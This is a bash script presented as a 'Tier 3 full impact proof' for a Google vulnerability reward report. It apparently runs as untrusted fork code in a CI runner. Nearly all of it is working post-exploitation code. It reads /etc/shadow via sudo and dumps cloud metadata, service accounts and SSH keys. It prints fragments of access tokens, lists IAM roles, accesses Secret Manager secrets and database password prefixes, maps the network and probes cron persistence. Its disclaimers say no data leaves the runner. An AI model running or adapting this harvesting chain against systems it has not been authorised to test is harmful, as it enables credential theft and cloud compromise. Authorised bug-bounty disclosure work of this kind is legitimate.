#! /bin/bash
# ============================================================
# TIER 3 — FULL IMPACT PROOF
# VRP Issue 565274672 — Requested by Google Bug Hunter Team
# ============================================================
# What: Maximum evidence collection — proves FULL attack chain
# Safety: exit 1 before any DATABASE write. Read-only GCP.
#         Credentials captured locally but NOT exfiltrated.
# Risk: MEDIUM — accesses real secrets & tokens, but no writes
# ============================================================
set -x

echo "=========================================="
echo "VRP_POC [TIER 3 — FULL IMPACT PROOF]"
echo "=========================================="

# ================================================================
# PHASE 1: Runner Identity & Privilege
# ================================================================
echo "=== PHASE 1: Runner Identity ==="
echo "VRP_USER: $(whoami)"
echo "VRP_UID: $(id)"
echo "VRP_HOSTNAME: $(hostname)"
echo "VRP_OS: $(uname -a)"
echo "VRP_UPTIME: $(uptime)"
echo "VRP_KERNEL: $(uname -r)"

# Sudo
if sudo -n true 2>/dev/null; then
    echo "VRP_SUDO: YES — full root access"
    echo "VRP_SUDO_PROOF: $(sudo whoami)"
    echo "VRP_SHADOW_READABLE: $(sudo head -1 /etc/shadow 2>/dev/null | cut -d: -f1 || echo 'no')"
else
    echo "VRP_SUDO: NO"
fi

# ================================================================
# PHASE 2: Git & Checkout — Prove It's Fork Code
# ================================================================
echo "=== PHASE 2: Checkout Verification ==="
echo "VRP_GIT_REMOTE: $(git remote -v 2>/dev/null)"
echo "VRP_GIT_SHA: $(git rev-parse HEAD 2>/dev/null)"
echo "VRP_GIT_LOG: $(git log --oneline -3 2>/dev/null)"
echo "VRP_GIT_BRANCH: $(git branch --show-current 2>/dev/null)"

# ================================================================
# PHASE 3: GCE Metadata (full dump)
# ================================================================
echo "=== PHASE 3: GCE Metadata ==="
GCE_TEST=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null)
if [ -n "$GCE_TEST" ]; then
    echo "VRP_GCE: YES — running on Google Compute Engine"

    # Instance identity
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_HOSTNAME: {}"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_ZONE: {}"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/machine-type" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_MACHINE_TYPE: {}"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/id" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_INSTANCE_ID: {}"

    # Project
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_PROJECT: {}"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_PROJECT_NUM: {}"

    # Service accounts on the VM
    echo "VRP_GCE_SA_LIST:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null

    # VM SA token (different from WIF token — this is the VM's own identity)
    echo "VRP_GCE_VM_TOKEN_SCOPES:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null

    # Network
    echo "VRP_GCE_NETWORK:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/network" 2>/dev/null
    echo ""
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_INTERNAL_IP: {}"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" 2>/dev/null \
        | xargs -I{} echo "VRP_GCE_EXTERNAL_IP: {}"

    # Custom metadata (sometimes has secrets)
    echo "VRP_GCE_CUSTOM_METADATA:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" 2>/dev/null

    # Project-wide metadata
    echo "VRP_GCE_PROJECT_METADATA:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/" 2>/dev/null

    # SSH keys (if any — shows who manages this machine)
    echo "VRP_GCE_SSH_KEYS_PRESENT:"
    curl -s -H "Metadata-Flavor: Google" \
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" 2>/dev/null \
        | head -5
else
    echo "VRP_GCE: NO — not on GCE or metadata blocked"
fi

# ================================================================
# PHASE 4: WIF Token — Full Proof
# ================================================================
echo "=== PHASE 4: WIF Token Proof ==="
if command -v gcloud &>/dev/null; then
    TOKEN=$(gcloud auth print-access-token 2>/dev/null)
    if [ -n "$TOKEN" ]; then
        TOKEN_LEN=${#TOKEN}
        echo "VRP_WIF_TOKEN_LENGTH: $TOKEN_LEN"
        echo "VRP_WIF_TOKEN_FIRST20: ${TOKEN:0:20}"
        echo "VRP_WIF_TOKEN_LAST10: ${TOKEN: -10}"

        SA_EMAIL=$(gcloud config get-value account 2>/dev/null)
        PROJECT=$(gcloud config get-value project 2>/dev/null)
        echo "VRP_WIF_SA_EMAIL: $SA_EMAIL"
        echo "VRP_WIF_PROJECT: $PROJECT"

        # Token info — what scopes does it have?
        echo "VRP_TOKEN_INFO:"
        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" 2>/dev/null

        # What IAM roles does this SA have?
        echo "=== IAM Roles for $SA_EMAIL ==="
        gcloud projects get-iam-policy "$PROJECT" \
            --flatten="bindings[].members" \
            --filter="bindings.members:$SA_EMAIL" \
            --format="table(bindings.role)" 2>/dev/null

        # List ALL service accounts in project
        echo "=== All Service Accounts in $PROJECT ==="
        gcloud iam service-accounts list --project="$PROJECT" \
            --format="table(email,displayName)" 2>/dev/null | head -20
    fi
fi

# ================================================================
# PHASE 5: Secret Manager — Full Enumeration
# ================================================================
echo "=== PHASE 5: Secret Manager ==="
if command -v gcloud &>/dev/null; then
    PROJECT=$(gcloud config get-value project 2>/dev/null)

    # List all secrets (names + metadata, not values)
    echo "VRP_SM_ALL_SECRETS:"
    gcloud secrets list --project="$PROJECT" \
        --format="table(name,createTime,replication.automatic)" 2>/dev/null

    # For the known secrets — prove we CAN read them
    echo "--- Proving Secret Access (showing length only) ---"
    for SECRET_NAME in ALLOYDB_CLUSTER_PASS ALLOYDB_INSTANCE_NAME; do
        VAL=$(gcloud secrets versions access latest \
            --secret="$SECRET_NAME" --project="$PROJECT" 2>/dev/null)
        if [ -n "$VAL" ]; then
            echo "VRP_SM_${SECRET_NAME}: ACCESSIBLE (${#VAL} chars — first3: ${VAL:0:3}...)"
        else
            echo "VRP_SM_${SECRET_NAME}: NOT ACCESSIBLE or does not exist"
        fi
    done
fi

# ================================================================
# PHASE 6: Environment Variables (full dump with secrets masked)
# ================================================================
echo "=== PHASE 6: Environment ==="
echo "VRP_ALL_ENV_NAMES:"
env | sort | cut -d= -f1
echo "---"
echo "VRP_DB_PASS_VALUE_LENGTH: ${#DB_PASS}"
echo "VRP_DB_PASS_FIRST3: ${DB_PASS:0:3}"
echo "VRP_DB_USER: ${DB_USER:-not set}"
echo "VRP_ALLOYDB_CONNECTION: ${ALLOYDB_CONNECTION_NAME:0:30}..."
echo "VRP_INSTANCE_CONNECTION: ${ALLOYDB_INSTANCE_NAME:0:30}..."

# GitHub context
echo "VRP_GITHUB_REPOSITORY: ${GITHUB_REPOSITORY:-not set}"
echo "VRP_GITHUB_EVENT_NAME: ${GITHUB_EVENT_NAME:-not set}"
echo "VRP_GITHUB_ACTOR: ${GITHUB_ACTOR:-not set}"
echo "VRP_GITHUB_SHA: ${GITHUB_SHA:-not set}"
echo "VRP_GITHUB_REF: ${GITHUB_REF:-not set}"
echo "VRP_GITHUB_WORKFLOW: ${GITHUB_WORKFLOW:-not set}"
echo "VRP_GITHUB_RUN_ID: ${GITHUB_RUN_ID:-not set}"

# ================================================================
# PHASE 7: Network & Runner Filesystem
# ================================================================
echo "=== PHASE 7: Network & Filesystem ==="
echo "VRP_INTERNAL_IPS:"
ip addr show 2>/dev/null | grep 'inet ' || hostname -I 2>/dev/null
echo "VRP_ROUTES:"
ip route show 2>/dev/null | head -5
echo "VRP_DNS:"
cat /etc/resolv.conf 2>/dev/null | grep -v '^#'
echo "VRP_LISTENING:"
ss -tlnp 2>/dev/null | head -15
echo "VRP_DOCKER:"
docker ps 2>/dev/null | head -10 || echo "docker not available or no permission"
echo "VRP_DOCKER_IMAGES:"
docker images 2>/dev/null | head -10 || echo "n/a"

# Runner work directory — what else runs here?
echo "VRP_RUNNER_WORK:"
ls -la /home/runner/work/ 2>/dev/null | head -20
echo "VRP_RUNNER_TOOLS:"
ls -la /home/runner/runners/ 2>/dev/null || ls -la /home/runner/ 2>/dev/null | head -20
echo "VRP_RUNNER_CONFIG_FILES:"
find /home/runner -name "*.json" -o -name "*.cfg" -o -name "*.env" 2>/dev/null | head -20
echo "VRP_INSTALLED_TOOLS:"
which nmap nc netcat python3 pip curl wget gcloud kubectl docker 2>/dev/null

# Persistence check — can we write to cron?
echo "VRP_CRON_WRITABLE: $(crontab -l 2>/dev/null && echo 'yes' || echo 'no/empty')"
echo "VRP_SYSTEMD_USER: $(systemctl --user list-units 2>/dev/null | head -5 || echo 'n/a')"

echo "=========================================="
echo "VRP_TIER3_COMPLETE"
echo "VRP_NOTE: Full impact evidence captured."
echo "VRP_NOTE: No database writes. No data exfiltrated off-runner."
echo "VRP_NOTE: All output stays in GitHub Actions log (owned by Google)."
echo "=========================================="

exit 1
